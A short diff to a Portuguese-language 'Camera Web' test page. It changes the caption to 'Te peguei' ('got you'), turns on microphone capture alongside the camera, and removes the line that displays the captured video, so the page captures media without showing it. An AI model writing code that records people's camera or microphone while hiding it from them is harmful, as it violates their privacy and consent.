@@ -12,7 +12,7 @@
 
     <h1>Camera Web</h1>
 
-    <p>Teste de acesso à câmera</p>
+ <p style="font-size: 32px">Te peguei</p>
 
     <video id="camera" autoplay playsinline></video>
 
@@ -24,12 +24,12 @@
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: true,
-                    audio: false
+                    audio: true
                 });
 
                 const video = document.getElementById("camera");
 
-                video.srcObject = stream;
+                
 
             } catch (erro) {
 
